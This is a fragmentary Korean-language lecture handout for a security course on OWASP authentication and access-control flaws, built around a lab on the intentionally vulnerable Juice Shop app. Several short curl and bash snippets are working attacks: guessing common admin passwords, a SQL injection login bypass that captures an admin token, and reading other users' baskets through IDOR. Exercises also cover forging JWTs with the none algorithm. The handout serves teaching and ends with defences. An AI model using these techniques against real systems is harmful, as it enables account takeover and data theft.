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OWASP Top 10 (3) - 인증 및 접근 제어 취약점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인증(Authentication)과 인가(Authorization)의 차이를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취약한 인증 메커니즘의 유형을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JWT 토큰 공격 기법을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IDOR(Insecure Direct Object Reference)과 권한 상승을 이해하고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| 10.20.30.201 | 실습 기지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JuiceShop:3000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인증 vs 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ID/PW 로그인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지문 인식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OTP (일회용 비밀번호)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일반 사용자: 자신의 주문만 볼 수 있음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관리자: 모든 사용자의 주문을 볼 수 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인증 vs 인가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= 건물 입구에서 출입증 확인 (이 사람이 직원인가?)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인가 = 각 방의 출입 권한 확인 (이 직원이 서버실에 들어갈 수 있는가?)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인증 취약점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JuiceShop에서 흔한 비밀번호로 admin 로그인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password in "admin" "admin123" "password" "123456" "admin@juice-sh.op";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RESULT=$(curl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-d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$password\"}"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 python3 -c "import sys,json; d=json.load(sys.stdin); print('SUCCESS' if 'authentication' in d else 'FAIL')" 2&gt;/dev/null)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"Password '$password': $RESULT"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세션 관리 취약점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공격자가 세션 ID 획득: session_id=ABC123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피해자에게 이 세션 ID가 포함된 링크 전송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피해자가 해당 세션으로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공격자가 세션 ID 획득: session_id=ABC123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피해자에게 이 세션 ID가 포함된 링크 전송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피해자가 해당 세션으로 로그인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공격자가 같은 세션 ID(ABC123)로 피해자의 세션 사용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JWT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[헤더].[페이로드].[서명]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접근 제어 취약점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 요청: GET /api/Users/22/orders  (내 주문 목록)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IDOR 공격: GET /api/Users/1/orders   (admin의 주문 목록!)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JuiceShop 챌린지: 접근 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Week 04에서 획득한 admin 토큰 사용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ADMIN_TOKEN=$(curl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'{"email":"'\'' OR 1=1--","password":"x"}'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sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2&gt;/dev/null)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admin 토큰으로 다른 사용자의 장바구니 열람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 in 1 2 3 4 5;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Basket $i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curl -s http://10.20.30.80:3000/rest/basket/$i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-H "Authorization: Bearer $ADMIN_TOKEN"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 python3 -m json.tool 2&gt;/d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접근 제어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// URL의 ID만으로 데이터 반환 - 위험!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app.get('/api/Users/:id', (req, res) =&gt;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return User.findByPk(req.params.id);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});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OpsClaw로 접근 제어 테스트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접근 제어 테스트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PROJECT_ID=$(curl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'{"name":"week06-access-control","request_text":"JuiceShop 접근 제어 취약점 점검","master_mode":"external"}'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sys,json;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http://localhost:8000/projects/$PROJECT_ID/plan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실습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기본/약한 비밀번호로 admin 로그인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보안 질문 확인 및 비밀번호 재설정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JWT 토큰 디코딩 및 알고리즘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none 알고리즘 JWT 위조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IDOR로 다른 사용자의 장바구니 접근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일반 사용자 토큰으로 관리자 API 접근 시도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실습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관리자 페이지(/#/administration) 직접 접근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JuiceShop에서 admin의 보안 질문을 확인하고, 비밀번호 재설정을 시도하라 (성공 여부와 과정을 기록)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 none 알고리즘 공격으로 admin 토큰을 위조하고, API 접근을 시도한 결과를 보고하라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일반 사용자 토큰으로 접근 가능한 관리자 API 엔드포인트를 찾아서 목록을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IDOR 취약점을 방어하기 위한 방법 3가지를 코드 예시와 함께 설명하라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인증(Authentication)은 "누구인가?", 인가(Authorization)는 "무엇을 할 수 있는가?"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약한 비밀번호, 예측 가능한 보안 질문은 인증 우회의 주요 원인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 공격: none 알고리즘, 비밀 키 브루트포스, 토큰 만료 무시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IDOR: URL/파라미터의 ID를 변경하여 다른 사용자의 데이터에 접근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수평적 권한 상승: 같은 레벨의 다른 사용자 데이터 접근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수직적 권한 상승: 상위 권한(admin) 기능에 접근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방어: 서버 측 권한 검증, RBAC, UUID 사용, 강력한 비밀번호 정책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